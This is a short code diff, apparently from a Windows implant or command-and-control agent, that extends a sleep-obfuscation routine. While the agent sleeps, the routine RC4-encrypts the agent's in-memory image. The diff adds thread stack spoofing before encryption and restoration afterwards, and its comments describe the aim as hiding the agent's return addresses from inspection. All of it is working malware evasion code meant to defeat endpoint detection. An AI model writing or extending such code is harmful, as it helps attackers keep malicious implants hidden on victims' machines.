@@ -411,10 +411,18 @@ void evasion_sleep_obfuscated(DWORD milliseconds) {
     USTRING data = { imageSize, imageSize, (PUCHAR)imageBase };
     USTRING key  = { sizeof(rc4Key), sizeof(rc4Key), rc4Key };
 
+    /* Spoof thread stack BEFORE encryption — hide agent return addresses.
+     * Must happen while code is still executable and readable.
+     * Only active when CONFIG_STACK_SPOOF is enabled (win11 builds). */
+#if CONFIG_STACK_SPOOF
+    void *spoof_ctx = NULL;
+    spoof_thread_stack(&spoof_ctx);
+#endif
+
     /* Encrypt with RC4 (image is already fully RW from per-section changes) */
     SystemFunction032(&data, &key);
 
-    /* Sleep (agent code is encrypted + non-executable) */
+    /* Sleep (agent code is encrypted + non-executable + stack spoofed) */
     Sleep(milliseconds);
 
     /* Decrypt with same RC4 key.
@@ -427,6 +435,12 @@ void evasion_sleep_obfuscated(DWORD milliseconds) {
         DWORD dummy;
         VirtualProtect(saved[i].base, saved[i].size, saved[i].prot, &dummy);
     }
+
+    /* Restore real return addresses now that code is executable again */
+#if CONFIG_STACK_SPOOF
+    if (spoof_ctx)
+        spoof_restore_thread_stack(spoof_ctx);
+#endif
 
     /* Wipe key */
     SecureZeroMemory(rc4Key, sizeof(rc4Key));
